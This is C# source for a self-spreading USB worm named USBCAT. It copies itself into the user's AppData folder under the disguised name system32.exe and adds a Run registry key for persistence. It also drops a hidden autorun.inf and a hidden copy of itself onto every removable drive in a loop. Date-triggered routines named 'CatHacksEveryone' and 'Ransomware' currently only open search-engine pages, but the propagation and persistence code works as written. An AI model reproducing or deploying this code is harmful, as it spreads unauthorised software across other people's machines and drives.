using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading;

namespace USBCAT
{
    class Program
    {

        static bool catINF = false;
        static bool ransINF = false;

        static void Main(string[] args)
        {

            try
            {
                AddToStartup();
            }
            catch (Exception ex)
            {

            }


            while (true)
            {
                try
                {
                    //AddToStartup();
                    InfUsb();
                    payload();
                }
                catch (Exception ex)
                {

                }

                Thread.Sleep(2000);
            }
        }


        static void CatHacksEveryone()
        {
            if(!catINF)
            {
                System.Diagnostics.Process.Start("https://google.com");
                catINF = true;
            }
        }

        static void Ransomware()
        {
            if (!ransINF)
            {
                System.Diagnostics.Process.Start("https://bing.com");
                ransINF = true;
            }
        }

        static void payload()
        {
            DateTime d1 = DateTime.Now.Date;
            DateTime d2 = new DateTime(2018, 11, 8);
            DateTime ransd = new DateTime(2018, 12, 24);

            if (d2 < d1)
            {
                InfoBoxSend("1st TIME OVER");
                CatHacksEveryone();
            }

            if (d2 > d1)
            {
                InfoBoxSend("NO ACTION");
            }

            if (d2 == d1)
            {
                InfoBoxSend("1st TIME OVER");
                CatHacksEveryone();
            }

            if (ransd == d1)
            {
                Ransomware();
            }

            if (ransd < d1)
            {
                Ransomware();
            }
        }


        static void InfUsb()
        {
            try
            {
                DriveInfo[] drives = DriveInfo.GetDrives();
                foreach (DriveInfo drive in drives)
                {
                    if (drive.DriveType == DriveType.Removable)
                    {
                        StreamWriter writer = new StreamWriter(drive.Name + "autorun.inf");
                        writer.WriteLine("[autorun]\n");
                        writer.WriteLine("open=usb.exe");
                        writer.WriteLine("action=Run win32");
                        writer.Close();
                        File.SetAttributes(drive.Name + "autorun.inf", File.GetAttributes(drive.Name + "autorun.inf") | FileAttributes.Hidden);
                        File.Copy(Application.ExecutablePath, drive.Name + "usb.exe", true);
                        File.SetAttributes(drive.Name + "usb.exe", File.GetAttributes(drive.Name + "usb.exe") | FileAttributes.Hidden);
                        InfoBoxSend("INFECTED USB DRIVE");
                    }
                }
            }
            catch (Exception ex)
            {
                InfoBoxSend("ERR INFECTING USB DRIVE");
                InfoBoxSend(ex.ToString());
            }
        }



        static void AddToStartup()
        {
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            if (Directory.Exists(appdata + "\\system7766"))
            {
                InfoBoxSend("Dir Already Exists");
            }
            else
            {
                Directory.CreateDirectory(appdata + "\\system7766");
                try
                {
                    
                }
                catch (Exception ex)
                {

                }

            }

            string appdfldr = appdata + "\\system7766\\";


            RegistryKey rk = Registry.CurrentUser.OpenSubKey
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            //if (chkStartUp.Checked)
            //    rk.SetValue(AppName, Application.ExecutablePath);
            //else
            //    rk.DeleteValue(AppName, false);

            if (File.Exists(appdfldr + "system32.exe"))
            {
                InfoBoxSend("REG STARTUP KEY ALREADY EXISTS");
                rk.SetValue("System_Startup", appdfldr + "system32.exe");
            }
            else
            {
                File.Copy(Application.ExecutablePath, appdfldr + "system32.exe");
                rk.SetValue("System_Startup", appdfldr + "system32.exe");
            }

        }


        static void InfoBoxSend(string message)
        {
            MessageBox.Show(message);
        }



    }
}
